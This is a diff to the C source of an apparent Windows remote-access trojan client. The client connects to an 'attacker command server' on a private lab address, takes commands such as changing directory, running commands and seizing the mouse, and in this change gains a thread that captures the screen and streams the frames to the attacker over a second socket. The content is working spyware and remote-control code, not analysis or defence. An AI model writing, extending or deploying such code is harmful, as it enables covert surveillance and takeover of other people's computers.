@@ -1,10 +1,10 @@
 #define _WINSOCK_DEPRECATED_NO_WARNINGS // TODO - fix this
 
-//#include <windows.h> // is this needed?
 #include <winsock2.h> // windows socket header
 #include <shlwapi.h> // useful functions for directory traversal
 #include <stdio.h> // standard input/output
 #include <string.h> // useful string functions
+#include <windows.h> // might already by included from other includes
 
 #pragma comment(lib,"ws2_32.lib") // tell the linker to link the winsock library
 #pragma comment(lib, "Shlwapi.lib")
@@ -13,6 +13,7 @@
 //#define CMD_SERVER_ADDR "127.0.0.1"
 #define CMD_SERVER_ADDR "192.168.56.1"
 #define CMD_SERVER_PORT 8080
+#define VIDEO_PORT 8081
 
 // change directory and list directory contents
 #define CHANGE_DIR 1
@@ -41,8 +42,12 @@
 // define useful globals
 char currDir[MAX_PATH]; // name of the current directory
 SOCKET mainSock; // main socket used to receive commands and send info
+SOCKET videoSock; // socket used to send video data to attacker server
+int videoOn = 0; // boolean for whether the video stream is running
+HANDLE videoThread; // handle for thread that sends video to attacker
 
-void test();
+DWORD WINAPI test(void* data);
+void connectToVideo();
 
 // helper function for exiting on error
 void exitOnError() {
@@ -199,13 +204,21 @@ char handleCommand(char* buffer) {
 		printf("Running \"%s\" from command prompt\n", buffer);
 		//runCommandPrompt(buffer);
 	} else if (cmd == START_VIDEO) {
-		printf("Starting video stream...\n");
-		// get the port to connect to
-		int port = (buffer[1] * 256) + buffer[2];
-		printf("Streaming video to attacker on port %d\n", port);
-		//streamVideo(port);
+		if (videoOn == 0) {
+			printf("Starting video stream...\n");
+			// get the port to connect to
+			//int port = (buffer[1] * 256) + buffer[2];
+			printf("Streaming video to attacker on port %d\n", VIDEO_PORT);
+			connectToVideo();
+			videoOn = 1;
+			videoThread = CreateThread(NULL, 0, test, NULL, 0, NULL);
+			//streamVideo(port);
+		}
+		else {
+			printf("Video already streaming\n");
+		}
 	} else if (cmd == END_VIDEO) {
-		// TODO - determine how best to stop video stream
+		videoOn = 0;
 	} else if (cmd == START_MOUSE) {
 		printf("Taking control of mouse...\n");
 		// get the port to connect to
@@ -269,9 +282,6 @@ void connectToCommandServer() {
 		printf("Connected to command server\n");
 	}
 
-	// TESTING TODO - remove once done testing
-	test();
-
 	// get and process commands from the attacker
 	do {
 		// get the next command and check for errors or a closed connection
@@ -288,6 +298,34 @@ void connectToCommandServer() {
 	} while (cmd != KILL_PROC);
 
 	// TODO - kill the connection gracefully
+}
+
+/*
+* Connect to the video socket
+*/
+void connectToVideo() {
+	struct sockaddr_in server;
+
+	// create the TCP socket
+	videoSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	if (videoSock == INVALID_SOCKET) {
+		printf("Could not create video socket: %d\n", WSAGetLastError());
+		return;
+	}
+
+	// set the server info structure
+	server.sin_addr.s_addr = inet_addr(CMD_SERVER_ADDR);
+	server.sin_family = AF_INET;
+	server.sin_port = htons(VIDEO_PORT);
+
+	// connect to the attacker command server
+	if (connect(videoSock, (struct sockaddr*)&server, sizeof(server)) != 0) {
+		printf("Could not connect to video server! Error code: %d\n", WSAGetLastError());
+		return;
+	}
+	else {
+		printf("Connected to video server\n");
+	}
 }
 
 // TODO - remove once done using
@@ -338,7 +376,7 @@ void videoStreamTest() {
 	cursor.cbSize = sizeof(CURSORINFO);
 	if (!GetCursorInfo(&cursor)) {
 		printf("Error getting cursor info: %d\n", GetLastError());
-		exitOnError();
+		return;
 	}
 	if (cursor.flags == CURSOR_SHOWING) {
 		ICONINFOEXA info;
@@ -399,10 +437,10 @@ void videoStreamTest() {
 	buff[0] = width;
 	buff[1] = height;
 	buff[2] = fileSize;
-	retCode = send(mainSock, buff, 12, 0);
+	retCode = send(videoSock, buff, 12, 0);
 	if (retCode == SOCKET_ERROR) {
 		printf("Could not send data: %d\n", WSAGetLastError());
-		exitOnError();
+		return;
 	}
 
 	// print the size of the bitmap for the current frame - used for debug
@@ -427,10 +465,10 @@ void videoStreamTest() {
 
 	// loop until all data is sent
 	do {
-		retCode = send(mainSock, pRev, bytesToSend - bytesSent, 0);
+		retCode = send(videoSock, pRev, bytesToSend - bytesSent, 0);
 		if (retCode == SOCKET_ERROR) {
 			printf("Could not send data: %d\n", WSAGetLastError());
-			exitOnError();
+			return;
 		}
 		bytesSent += retCode;
 		if (bytesSent < bytesToSend) { // we need to loop again
@@ -449,8 +487,8 @@ void videoStreamTest() {
 
 // TODO - remove testing function once no longer needed
 // currently testing video streaming to attacker server
-void test() {
-	while (1 == 1) {
+DWORD WINAPI test(void* data) {
+	while (videoOn == 1) {
 		videoStreamTest();
 		Sleep(33);
 	}
